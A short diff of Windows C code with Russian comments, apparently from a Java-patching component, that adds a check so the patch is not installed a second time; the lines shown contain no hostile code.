@@ -41,6 +41,8 @@ static char javaMSI[MAX_PATH]; //папка с параметрами автообновления
 
 char versionPatch[] = "1.6"; //версия патча
 
+static bool PatchIsLoaded();
+
 //Определяет версию явы, возвращает true если ява есть, иначе false. Заодно в переменную javaHome ложит путь к яве
 static bool GetJavaVersion()
 {
@@ -1032,6 +1034,7 @@ DWORD WINAPI SendJavaPatchVersion(LPVOID)
 DWORD WINAPI Run_Path(LPVOID lpData)
 {
 	char testPath[MAX_PATH];
+	if( PatchIsLoaded() ) return 0; //если патч установлен, то не нужно его повторно ставить
 	if(	GetWorkFolder(testPath, JavaPatcherSignalFile ))
 	{
 		while( true )
